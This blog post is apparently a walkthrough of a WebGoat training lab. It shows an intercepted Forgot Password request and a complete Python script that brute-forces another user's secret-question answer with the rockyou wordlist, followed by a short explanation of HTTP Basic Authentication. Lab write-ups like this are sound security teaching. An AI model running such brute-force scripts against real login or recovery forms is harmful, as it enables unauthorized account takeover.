---
layout: post
title:  "OWASP BWA WebGoat Challenge Part 4"
date:   2017-01-24 19:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
# Authentication Flaws: Forgot Password
Instructions:

- Users can retrieve their password if they can answer the secret question properly. There is no lock-out mechanism on this 'Forgot Password' page. Your username is 'webgoat' and your favorite color is 'red'. The goal is to retrieve the password of another user. 

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_4/landing-page.jpg">

So we have two hints that are going to help us solve this challenge. The first is on the login page, and says "See the OWASP admin if you do not have an account". The second hint for this challenge is in the phrase "no lock-out mechanism". Sounds like we're going to need to brute-force the admin's favorite color!

So first we navigate to the admin's Forgot Password page, and intercept a test request

```
POST /WebGoat/attack?Screen=64&menu=500 HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.56.101/WebGoat/attack?Screen=64&menu=500
Cookie: JSESSIONID=C1702A9FE913D04E2F177203213F9149; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
Authorization: Basic dXNlcjp1c2Vy
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

Color=blue&SUBMIT=Submit
```

Now that we have a template request for our brute-forcer, it's time to break out everyone's favorite scripting language (or at least mine), Python, and write ourselves a handy-dandy brute-force script.

{% highlight python %}
import sys
import requests

wordlist_paths = [
	"long_long_path_to_dir/rockyou.txt",
]


def main():
	wordlist = []
	print "[+] Populating the wordlist ..."
	for wordlist_path in wordlist_paths:
		print "	[*] Populating from list: {}".format(wordlist_path.split("/")[-1])
		with open(wordlist_path, "r") as wordlist_file:
			word_data = wordlist_file.read()
			wordlist += word_data.splitlines()
	print "	[*] Checking that wordlist was populated"
	if  len(wordlist) == 0:
		print "[-] Wordlist was not populated... Exiting"
		sys.exit(1)
	print "[+] Wordlist populated successfully"

	headers = {
		"user-agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
	}
	cookies = dict(JSESSIONID="C1702A9FE913D04E2F177203213F9149",acopendivids="swingset,jotto,phpbb2,redmine",acgroupswithpersist="nada")

	for index,word in enumerate(wordlist):
		print ("[*] Attempt {} | Pass: {}".format(index, word))
		payload= {"Color":word,"SUBMIT":"Submit"}
		r = requests.post("http://192.168.56.101/WebGoat/attack?Screen=64&menu=500", params=payload, headers=headers, cookies=cookies)
		if r.status_code == 200:
			if "congratulations" in r.text.lower():
				print ("[+] SUCCESS! Password is: {}".format(word))
				sys.exit(0)
		else:
			print ("error: {}".format(r.text))
			sys.exit(1)

main()

{% endhighlight %}

So instead of opting for a truly naive brute-force approach, I decided to go with a wordlist. Specifically the "rockyou.txt" list. It has an enormous list of some of the most common passwords in it, which include colors. The way this script works is by parsing each guess from the .txt wordlist file and passing it to a properly formatted request to the Forgot Password request URL. The script maintains headers and cookies to (semi) convincingly spoof the browser. The script then checks the lowercase-cast response for the string "congratulations", which has been in every challenge so far as a flag for correct guess. 

Let's see if it works!

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_4/rocked-you.jpg">

rocked.txt

# Basic Authentication
This lesson is broken on v5.4 (or at least my implementation of it), but it covers the Basic Authentication protocol. Basic Authentication is a simple method for enforcing access controls on server resources. The basic logical flow is as follows:

1. User requests a resource from the server
* I would like this page
2. Server responds with HTTP 401 Unauthorized
* I don't know who you are, or if you can have that
3. User sends request with Authorization header
* Authorization: Basic ```base64(user:passwd)```
4. Server sends response according to authorization status

It is important to remember that in HTTP everything is transmitted in cleartext, so this does not prevent anyone from stealing login credentials. HTTPS should be used in production systems.